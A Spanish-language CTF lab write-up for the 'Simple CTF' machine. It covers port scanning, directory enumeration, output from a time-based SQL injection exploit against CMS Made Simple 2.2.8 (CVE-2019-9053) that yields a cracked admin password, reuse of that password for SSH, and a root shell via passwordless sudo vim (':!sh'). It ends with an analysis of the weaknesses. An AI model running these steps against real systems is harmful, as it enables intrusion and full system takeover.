# Simple CTF
## Initial Scan
```
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.95.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
```
## Enum
### HTTP
#### Gobuster
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
```
##### Simple

Este endpoint es una instalacion de CMS Made Simple, si prestamos atención al contenido vemos lo siguiente
```
 This site is powered by CMS Made Simple version 2.2.8
```
Con esto ya tenmos la version exacta y resulta que existe una vuln hasta la versiojn 2.2.10 del CMS que permite ejecutar una time based sqli en el servicio para recuperar las credenciales del administrador

## Exploit
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
Con esta contraseña podemos acceder tanto al CMS como a la propia máquina ya que se reutilizo la contraseña en mas servicios

## Privesc
```us
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
Con esto escalamos de la siguietne manera 
```
$ sudo /usr/bin/vim	
> :!sh
```
# Analisís de la intrusión
### CVE 2019-9053 
El servicio web usaba un CMS con una vulnerabilidad de SQLi Time Based que nos permite conocer la contraseña del admin
### Bad Password policie
Las contraseña usada por el administrador esta en los principales diccionarios de contraseñas 
### Password Reutilization
La contraseña usada para el CMS es la misma que para el usuario, lo que implico que al comprometer el CMS se comprometiera el sitema entero
### Provilegd vim execution
El usaurio mitch puede ejecutar vim con privilegios de sudoer, esto permite spawnear una shell como root escanalando asi privilegios
